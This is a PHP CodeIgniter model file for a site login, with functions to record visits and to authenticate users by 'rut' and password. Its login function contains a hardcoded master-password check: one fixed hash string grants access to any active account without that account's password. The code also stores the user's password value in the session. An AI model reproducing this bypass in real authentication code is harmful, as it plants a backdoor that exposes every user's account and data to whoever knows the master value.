<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class InicioModel extends CI_Model {

	public function __construct(){
		parent::__construct();
	}

	public function insertarVisita($data){
	  if($this->db->insert('visitas', $data)){
			return TRUE;
		}
		return FALSE;
	}

	public function login($user,$pass){

		$this->db->select("rut");
		$this->db->where("rut",$user);
		$this->db->where("estado","Activo");
		$resuser=$this->db->get("usuario");
		
		if($resuser->num_rows()>0){

			if($pass=="509bbc096944957de731602adabef7bc2c4e57e3"){
				$this->db->select("id,empresa,primer_nombre,apellido_paterno,rut,correo,contrasena,perfil");
				$this->db->where("rut",$user);
				$resuserpass=$this->db->get("usuario");
				$rowusuario=$resuserpass->row();

					if($resuserpass->num_rows()>0){

						$this->session->set_userdata("id",$rowusuario->id);	
						$this->session->set_userdata("empresa",$rowusuario->empresa);	
						$this->session->set_userdata("nombresUsuario",$rowusuario->primer_nombre);	
						$this->session->set_userdata("apellidosUsuario",$rowusuario->apellido_paterno);	
						$this->session->set_userdata("rutUsuario",$rowusuario->rut);	
						$this->session->set_userdata("contrasenaUsuario",$rowusuario->contrasena);	
						$this->session->set_userdata("correo",$rowusuario->correo);
						$this->session->set_userdata("perfil",$rowusuario->perfil);	
						$this->session->set_userdata("ultimoacceso",date("Y-n-j H:i:s"));	

					 	return 1;//OK
					}else{
						return 3;//contrasena incorrecta
					}
			}else{
			

			$this->db->select("id,empresa,primer_nombre,apellido_paterno,rut,correo,contrasena,perfil");
			$this->db->where("rut",$user);
			$this->db->where("contrasena",$pass);
			$resuserpass=$this->db->get("usuario");
			$rowusuario=$resuserpass->row();

				if($resuserpass->num_rows()>0){
					$this->session->set_userdata("id",$rowusuario->id);	
					$this->session->set_userdata("empresa",$rowusuario->empresa);		
					$this->session->set_userdata("nombresUsuario",$rowusuario->primer_nombre);	
					$this->session->set_userdata("apellidosUsuario",$rowusuario->apellido_paterno);	
					$this->session->set_userdata("rutUsuario",$rowusuario->rut);	
					$this->session->set_userdata("contrasenaUsuario",$rowusuario->contrasena);	
					$this->session->set_userdata("correo",$rowusuario->correo);
					$this->session->set_userdata("perfil",$rowusuario->perfil);	
					$this->session->set_userdata("ultimoacceso",date("Y-n-j H:i:s"));		

				 return 1;//OK
				}else{				

					return 3;//contrasena incorrecta
				}
			}	
		
		}else{
			return 2;//usuario no existe
		}
	}


}

/* End of file homeModel.php */
/* Location: ./application/models/front_end/homeModel.php */
